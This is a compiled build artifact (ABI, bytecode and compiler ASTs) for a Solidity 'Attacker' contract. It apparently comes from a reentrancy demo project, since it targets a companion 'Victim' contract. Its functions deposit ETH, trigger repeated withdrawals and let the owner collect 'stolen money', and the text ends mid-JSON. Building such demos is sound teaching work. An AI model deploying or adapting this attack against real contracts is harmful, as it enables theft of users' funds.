{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "poorvictim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "internalType": "contract Victim",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "recieve",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawstolenmoney",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.8.19+commit.7dd6d404\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"poorvictim\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recieve\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"victim\",\"outputs\":[{\"internalType\":\"contract Victim\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawstolenmoney\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"project:/contracts/Attacker.sol\":\"Attacker\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"project:/contracts/Attacker.sol\":{\"keccak256\":\"0x7b989e89fb68f4b64d50816a0f24f115c104f5ce49921224c04f85814cbda6af\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://1c0e588856b473886196598cc06985a9f5972c2420a2d0eeca7d9cf4af5f01ff\",\"dweb:/ipfs/QmZBkFAfpHVcbvbaEatZoTkqBDvgRNQDvxZL4aVaA6fGES\"]},\"project:/contracts/Victim.sol\":{\"keccak256\":\"0xe9422f2e697e3007da15e8906a307f62dd50aedd1a0b760c3fa7ae7cd7788e62\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://e80ec474b984138be655b0e54a5ae2e2983df5d4ac2ec925ba33779532322d28\",\"dweb:/ipfs/QmPGomMmL54N7Ndm2Ye1PpEWcVFsieyEhTk9oLLz2fxcAT\"]}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506040516106e93803806106e98339818101604052810190610032919061011c565b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b610591806101586000396000f3fe60806040526004361061003f5760003560e01c8063930c200314610044578063979fd9f21461006f5780639e5faafc14610086578063a9e10bf214610090575b600080fd5b34801561005057600080fd5b5061005961009a565b6040516100669190610457565b60405180910390f35b34801561007b57600080fd5b506100846100be565b005b61008e6101b9565b005b61009861030e565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461014e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610145906104cf565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101b6573d6000803e3d6000fd5b50565b670de0b6b3a76400003411610203576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fa9061053b565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027357600080fd5b505af1158015610287573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102f457600080fd5b505af1158015610308573d6000803e3d6000fd5b50505050565b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156103d65760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103bd57600080fd5b505af11580156103d1573d6000803e3d6000fd5b505050505b565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061041d610418610413846103d8565b6103f8565b6103d8565b9050919050565b600061042f82610402565b9050919050565b600061044182610424565b9050919050565b61045181610436565b82525050565b600060208201905061046c6000830184610448565b92915050565b600082825260208201905092915050565b7f4e6f7420796f7572206d6f6e6579000000000000000000000000000000000000600082015250565b60006104b9600e83610472565b91506104c482610483565b602082019050919050565b600060208201905081810360008301526104e8816104ac565b9050919050565b7f53656e64206d6520736f6d652045544820746f20737461727400000000000000600082015250565b6000610525601983610472565b9150610530826104ef565b602082019050919050565b6000602082019050818103600083015261055481610518565b905091905056fea26469706673582212205ee57eeb3d4f4e96992c8aca76fbb3d0b1f0c6e3beedb5f2947877652d98a92764736f6c63430008130033",
  "deployedBytecode": "0x60806040526004361061003f5760003560e01c8063930c200314610044578063979fd9f21461006f5780639e5faafc14610086578063a9e10bf214610090575b600080fd5b34801561005057600080fd5b5061005961009a565b6040516100669190610457565b60405180910390f35b34801561007b57600080fd5b506100846100be565b005b61008e6101b9565b005b61009861030e565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461014e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610145906104cf565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101b6573d6000803e3d6000fd5b50565b670de0b6b3a76400003411610203576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101fa9061053b565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027357600080fd5b505af1158015610287573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102f457600080fd5b505af1158015610308573d6000803e3d6000fd5b50505050565b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163111156103d65760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156103bd57600080fd5b505af11580156103d1573d6000803e3d6000fd5b505050505b565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061041d610418610413846103d8565b6103f8565b6103d8565b9050919050565b600061042f82610402565b9050919050565b600061044182610424565b9050919050565b61045181610436565b82525050565b600060208201905061046c6000830184610448565b92915050565b600082825260208201905092915050565b7f4e6f7420796f7572206d6f6e6579000000000000000000000000000000000000600082015250565b60006104b9600e83610472565b91506104c482610483565b602082019050919050565b600060208201905081810360008301526104e8816104ac565b9050919050565b7f53656e64206d6520736f6d652045544820746f20737461727400000000000000600082015250565b6000610525601983610472565b9150610530826104ef565b602082019050919050565b6000602082019050818103600083015261055481610518565b905091905056fea26469706673582212205ee57eeb3d4f4e96992c8aca76fbb3d0b1f0c6e3beedb5f2947877652d98a92764736f6c63430008130033",
  "immutableReferences": {},
  "generatedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:1199:2",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "47:35:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "57:19:2",
                  "value": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "73:2:2",
                        "type": "",
                        "value": "64"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "67:5:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "67:9:2"
                  },
                  "variableNames": [
                    {
                      "name": "memPtr",
                      "nodeType": "YulIdentifier",
                      "src": "57:6:2"
                    }
                  ]
                }
              ]
            },
            "name": "allocate_unbounded",
            "nodeType": "YulFunctionDefinition",
            "returnVariables": [
              {
                "name": "memPtr",
                "nodeType": "YulTypedName",
                "src": "40:6:2",
                "type": ""
              }
            ],
            "src": "7:75:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "177:28:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "194:1:2",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "197:1:2",
                        "type": "",
                        "value": "0"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "187:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "187:12:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "187:12:2"
                }
              ]
            },
            "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
            "nodeType": "YulFunctionDefinition",
            "src": "88:117:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "300:28:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "317:1:2",
                        "type": "",
                        "value": "0"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "320:1:2",
                        "type": "",
                        "value": "0"
                      }
                    ],
                    "functionName": {
                      "name": "revert",
                      "nodeType": "YulIdentifier",
                      "src": "310:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "310:12:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "310:12:2"
                }
              ]
            },
            "name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
            "nodeType": "YulFunctionDefinition",
            "src": "211:117:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "379:81:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "389:65:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "404:5:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "411:42:2",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "400:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "400:54:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "389:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "361:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "371:7:2",
                "type": ""
              }
            ],
            "src": "334:126:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "511:51:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "521:35:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "550:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "532:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "532:24:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "521:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "493:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "503:7:2",
                "type": ""
              }
            ],
            "src": "466:96:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "611:79:2",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "668:16:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "677:1:2",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "680:1:2",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "670:6:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "670:12:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "670:12:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "634:5:2"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "659:5:2"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_address",
                              "nodeType": "YulIdentifier",
                              "src": "641:17:2"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "641:24:2"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "631:2:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "631:35:2"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "624:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "624:43:2"
                  },
                  "nodeType": "YulIf",
                  "src": "621:63:2"
                }
              ]
            },
            "name": "validator_revert_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "604:5:2",
                "type": ""
              }
            ],
            "src": "568:122:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "759:80:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "769:22:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "784:6:2"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "778:5:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "778:13:2"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "769:5:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "827:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_address",
                      "nodeType": "YulIdentifier",
                      "src": "800:26:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "800:33:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "800:33:2"
                }
              ]
            },
            "name": "abi_decode_t_address_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "737:6:2",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "745:3:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "753:5:2",
                "type": ""
              }
            ],
            "src": "696:143:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "922:274:2",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "968:83:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                            "nodeType": "YulIdentifier",
                            "src": "970:77:2"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "970:79:2"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "970:79:2"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "943:7:2"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "952:9:2"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "939:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "939:23:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "964:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "935:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "935:32:2"
                  },
                  "nodeType": "YulIf",
                  "src": "932:119:2"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "1061:128:2",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "1076:15:2",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "1090:1:2",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "1080:6:2",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "1105:74:2",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "1151:9:2"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "1162:6:2"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "1147:3:2"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "1147:22:2"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "1171:7:2"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_address_fromMemory",
                          "nodeType": "YulIdentifier",
                          "src": "1115:31:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1115:64:2"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "1105:6:2"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_address_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "892:9:2",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "903:7:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "915:6:2",
                "type": ""
              }
            ],
            "src": "845:351:2"
          }
        ]
      },
      "contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
      "id": 2,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "deployedGeneratedSources": [
    {
      "ast": {
        "nodeType": "YulBlock",
        "src": "0:3169:2",
        "statements": [
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "52:81:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "62:65:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "77:5:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "84:42:2",
                        "type": "",
                        "value": "0xffffffffffffffffffffffffffffffffffffffff"
                      }
                    ],
                    "functionName": {
                      "name": "and",
                      "nodeType": "YulIdentifier",
                      "src": "73:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "73:54:2"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "62:7:2"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "34:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "44:7:2",
                "type": ""
              }
            ],
            "src": "7:126:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "171:28:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "181:12:2",
                  "value": {
                    "name": "value",
                    "nodeType": "YulIdentifier",
                    "src": "188:5:2"
                  },
                  "variableNames": [
                    {
                      "name": "ret",
                      "nodeType": "YulIdentifier",
                      "src": "181:3:2"
                    }
                  ]
                }
              ]
            },
            "name": "identity",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "157:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "ret",
                "nodeType": "YulTypedName",
                "src": "167:3:2",
                "type": ""
              }
            ],
            "src": "139:60:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "265:82:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "275:66:2",
                  "value": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "333:5:2"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_uint160",
                              "nodeType": "YulIdentifier",
                              "src": "315:17:2"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "315:24:2"
                          }
                        ],
                        "functionName": {
                          "name": "identity",
                          "nodeType": "YulIdentifier",
                          "src": "306:8:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "306:34:2"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "288:17:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "288:53:2"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "275:9:2"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_uint160_to_t_uint160",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "245:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "255:9:2",
                "type": ""
              }
            ],
            "src": "205:142:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "413:66:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "423:50:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "467:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "convert_t_uint160_to_t_uint160",
                      "nodeType": "YulIdentifier",
                      "src": "436:30:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "436:37:2"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "423:9:2"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_uint160_to_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "393:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "403:9:2",
                "type": ""
              }
            ],
            "src": "353:126:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "559:66:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "569:50:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "613:5:2"
                      }
                    ],
                    "functionName": {
                      "name": "convert_t_uint160_to_t_address",
                      "nodeType": "YulIdentifier",
                      "src": "582:30:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "582:37:2"
                  },
                  "variableNames": [
                    {
                      "name": "converted",
                      "nodeType": "YulIdentifier",
                      "src": "569:9:2"
                    }
                  ]
                }
              ]
            },
            "name": "convert_t_contract$_Victim_$157_to_t_address",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "539:5:2",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "converted",
                "nodeType": "YulTypedName",
                "src": "549:9:2",
                "type": ""
              }
            ],
            "src": "485:140:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "710:80:2",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "pos",
                        "nodeType": "YulIdentifier",
                        "src": "727:3:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "777:5:2"
                          }
                        ],
                        "functionName": {
                          "name": "convert_t_contract$_Victim_$157_to_t_address",
                          "nodeType": "YulIdentifier",
                          "src": "732:44:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "732:51:2"
                      }
                    ],
                    "functionName": {
                      "name": "mstore",
                      "nodeType": "YulIdentifier",
                      "src": "720:6:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "720:64:2"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "720:64:2"
                }
              ]
            },
            "name": "abi_encode_t_contract$_Victim_$157_to_t_address_fromStack",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "698:5:2",
                "type": ""
              },
              {
                "name": "pos",
                "nodeType": "YulTypedName",
                "src": "705:3:2",
                "type": ""
              }
            ],
            "src": "631:159:2"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "908:138:2",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "918:26:2",
                  "value": {
                    "arguments": [
                      {
                        "name": "headStart",
                        "nodeType": "YulIdentifier",
                        "src": "930:9:2"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "941:2:2",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "add",
                      "nodeType": "YulIdentifier",
                      "src": "926:3:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "926:18:2"
                  },
                  "variableNames": [
                    {
                      "name": "tail",
                      "nodeType": "YulIdentifier",
                      "src": "918:4:2"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value0",
                        "nodeType": "YulIdentifier",
                        "src": "1012:6:2"
                      },
                      {
                        "arguments": [
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "1025:9:2"
                          },
                          {
                            "kind": "number",
                            "nodeType": "YulLiteral",
                            "src": "1036:1:2",
                            "type": "",
                            "value": "0"
                          }
                        ],
                        "functionName": {
                          "name": "add",
                          "nodeType": "YulIdentifier",
                          "src": "1021:3:2"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "1021:17:2"
                      }
                    ],
                    "functionName": {
                      "name": "abi_encode_t_contract$_Victim_$157_to_t_address_fromStack",
                      "nodeType": "YulIdentifier",
                      "src": "954:57:2"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "954:85:2"
                  },
